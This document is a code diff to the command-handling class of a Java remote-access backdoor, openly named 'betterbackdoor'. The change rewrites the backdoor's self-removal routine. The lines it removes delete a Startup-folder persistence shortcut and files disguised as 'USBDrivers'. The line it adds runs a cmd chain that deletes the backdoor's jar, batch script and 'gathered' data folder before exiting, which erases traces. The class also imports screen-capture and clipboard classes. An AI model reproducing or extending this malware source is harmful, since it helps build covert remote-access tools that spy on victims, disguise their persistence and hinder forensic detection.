@@ -1,7 +1,6 @@
 package com.github.thatcherdev.betterbackdoor.backdoor;
 
 import java.util.Scanner;
-import org.apache.commons.io.FileUtils;
 import java.awt.datatransfer.DataFlavor;
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -113,17 +112,8 @@ public class HandleCommand {
 			}
 		} else if (command.equals("remove")) {
 			try {
-				if (new File("C:\\Users\\" + System.getProperty("user.name")
-						+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk")
-								.exists())
-					FileUtils.forceDelete(new File("C:\\Users\\" + System.getProperty("user.name")
-							+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk"));
-				if (new File("USBDrivers.jar").exists())
-					Runtime.getRuntime().exec(
-							"cmd /c ping localhost -n 5 > nul && del /f /q USBDrivers.jar USBDrivers.vbs && rd /s /q gathered jre scripts && cd.. && rd /s /q USBDrivers");
-				if (new File("run.jar").exists())
-					Runtime.getRuntime().exec(
-							"cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat install.jar install.bat && rd /s /q gathered jre scripts");
+				Runtime.getRuntime().exec(
+						"cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q gathered scripts jre");
 				System.exit(0);
 			} catch (Exception e) {
 				send = "An error occurred when trying to remove files:\n" + e.getMessage();
